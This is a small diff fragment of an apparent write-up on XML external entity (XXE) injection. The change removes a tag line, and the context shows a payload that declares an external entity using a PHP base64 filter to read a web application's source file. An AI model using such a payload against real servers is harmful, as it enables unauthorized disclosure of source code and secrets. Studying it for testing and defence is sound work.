@@ -34,7 +34,7 @@ We can use this to look at source code of the webpage using php filters and conv
 
 
 ### The payload
-#XML #XEE
+
 ```
 <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/demo.php"> ]>
 
